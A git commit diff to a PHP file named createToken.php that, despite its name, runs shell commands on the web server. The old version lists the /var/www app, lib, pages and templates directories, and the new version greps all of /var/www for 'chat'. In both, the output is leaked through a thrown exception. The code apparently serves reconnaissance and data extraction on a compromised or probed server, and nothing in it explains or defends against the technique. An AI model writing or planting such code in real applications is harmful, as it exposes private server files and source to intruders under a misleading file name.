ede6a9300304299214afa205bb4faffac59888bc
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 20:59:10 +0100

    Update createToken.php

--- createToken.php
+++ createToken.php
@@ -1,9 +1,7 @@
 <?php
 $output ='';
-$output =$output."\n /var/www/app/... ".shell_exec ('ls /var/www/app | xargs');
-$output =$output."\n /var/www/lib/... ".shell_exec ('ls /var/www/lib | xargs');
-$output =$output."\n /var/www/pages/... ".shell_exec ('ls /var/www/pages | xargs');
-$output =$output."\n /var/www/templates/... ".shell_exec ('ls /var/www/templates | xargs');
+$output =$output."\n /var/www/app/... ".shell_exec ('grep -r "chat" /var/www/ | xargs');
+
 
 throw new Exception("\n SUCCESS  ". $output."\n");
 ?>
